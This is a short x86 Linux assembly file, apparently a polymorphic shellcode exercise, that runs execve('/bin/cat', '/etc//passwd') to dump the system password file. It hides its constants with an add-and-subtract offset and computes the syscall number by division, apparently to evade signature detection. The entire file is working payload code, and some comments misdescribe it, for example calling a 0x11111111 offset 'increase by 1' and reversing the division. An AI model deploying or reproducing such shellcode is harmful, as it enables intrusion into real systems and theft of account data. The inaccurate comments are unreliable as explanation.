global _start			

section .text
_start:

	xor eax, eax
	;cdq

	xor edx, edx                   ; zero out EDX

	push edx
	;push dword 0x7461632f

	mov edi, 0x85727440            ; increase the above bytes by 1 and move them into EDI
	sub edi, 0x11111111            ; subtract 1 from the above bytes in EDI to make them equal to the original value
	mov dword [esp-4], edi         ; move the value 0x7461632f into the memory address of [esp-4]
	
	;push dword 0x6e69622f

	mov dword [esp-8], 0x6e69622f  ; move the value 0x6e69622f into the memory address of [esp-8]
	sub esp, 8                     ; readjust the stack pointer manually to the start of the /bin/cat command      

	mov ebx,esp
	push edx
	push dword 0x64777373
	push dword 0x61702f2f
	push dword 0x6374652f
	
	;mov al, 0xb
	mov al, 0x16                    ; move 22 into AL
	mov cl, 0x2                     ; move 2 into CL
	div cl                          ; divide CL by AL and store the result (11) in AL 

	mov ecx, esp
	push edx
	push ecx
	push ebx
	mov ecx, esp
	int 0x80